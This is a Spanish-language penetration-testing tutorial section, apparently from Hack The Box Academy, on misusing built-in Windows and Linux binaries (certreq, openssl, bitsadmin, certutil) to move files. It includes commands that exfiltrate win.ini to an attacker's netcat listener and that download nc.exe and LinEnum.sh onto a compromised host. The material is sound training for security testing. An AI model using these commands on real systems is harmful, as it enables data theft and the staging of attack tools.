La frase "Living off the land" fue acuñada por Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) y Matt Graeber [@mattifestation](https://twitter.com/mattifestation) en [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).

El término LOLBins (Living off the Land binaries) surgió de una discusión en Twitter sobre cómo llamar a los binarios que un atacante puede usar para realizar acciones más allá de su propósito original. Actualmente, existen dos sitios web que recopilan información sobre los binarios Living off the Land:

- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)

Los binarios Living off the Land se pueden usar para realizar funciones como:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

Esta sección se enfocará en usar los proyectos LOLBAS y GTFOBins y proporcionará ejemplos para funciones de descarga y carga en sistemas Windows y Linux.

---

## Using the LOLBAS and GTFOBins Project

[LOLBAS for Windows](https://lolbas-project.github.io/#) y [GTFOBins for Linux](https://gtfobins.github.io/) son sitios web donde podemos buscar binarios que podemos usar para diferentes funciones.

### LOLBAS

Para buscar funciones de descarga y carga en [LOLBAS](https://lolbas-project.github.io/) podemos usar `/download` o `/upload`.

![image](https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg)

Usemos [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) como ejemplo.

Necesitamos escuchar en un puerto en nuestro host de ataque para el tráfico entrante usando Netcat y luego ejecutar certreq.exe para cargar un archivo.

### Upload win.ini to our Pwnbox

```r
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

Esto enviará el archivo a nuestra sesión de Netcat, y podemos copiar y pegar su contenido.

### File Received in our Netcat Session

```r
sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Si obtienes un error al ejecutar `certreq.exe`, la versión que estás usando puede no contener el parámetro `-Post`. Puedes descargar una versión actualizada [aquí](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) y volver a intentarlo.

### GTFOBins

Para buscar la función de descarga y carga en [GTFOBins for Linux Binaries](https://gtfobins.github.io/), podemos usar `+file download` o `+file upload`.

![image](https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg)

Usemos [OpenSSL](https://www.openssl.org/). Frecuentemente está instalado e incluido en otras distribuciones de software, con sysadmins usándolo para generar certificados de seguridad, entre otras tareas. OpenSSL se puede usar para enviar archivos "nc style".

Necesitamos crear un certificado y iniciar un servidor en nuestro Pwnbox.

### Create Certificate in our Pwnbox

```r
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

### Stand up the Server in our Pwnbox

```r
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

A continuación, con el servidor en funcionamiento, necesitamos descargar el archivo desde la máquina comprometida.

### Download File from the Compromised Machine

```r
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

---

## Other Common Living off the Land tools

### Bitsadmin Download function

El [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) se puede usar para descargar archivos desde sitios HTTP y shares SMB. Toma en cuenta "inteligentemente" la utilización del host y la red para minimizar el impacto en el trabajo de primer plano de un usuario.

### File Download with Bitsadmin

```r
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell también permite la interacción con BITS, habilita la descarga y carga de archivos, admite credenciales y puede usar servidores proxy especificados.

### Download

```r
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

---

### Certutil

Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) descubrió que Certutil se puede usar para descargar archivos arbitrarios. Está disponible en todas las versiones de Windows y ha sido una técnica popular de transferencia de archivos, sirviendo como un `wget` de facto para Windows. Sin embargo, la Interfaz de Escaneo Antimalware (AMSI) actualmente detecta esto como uso malicioso de Certutil.

### Download a File with Certutil

```r
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

---

## Extra Practice

Vale la pena revisar los sitios web de LOLBAS y GTFOBins y experimentar con tantos métodos de transferencia de archivos como sea posible. Cuanto más oscuros, mejor. Nunca sabes cuándo necesitarás uno de estos binarios durante una evaluación, y te ahorrará tiempo si ya tienes notas detalladas sobre múltiples opciones. Algunos de los binarios que se pueden aprovechar para transferencias de archivos pueden sorprenderte.

En las dos secciones finales, abordaremos consideraciones de detección con respecto a las transferencias de archivos y algunos pasos que podemos seguir para evadir la detección si el alcance de nuestra evaluación lo requiere.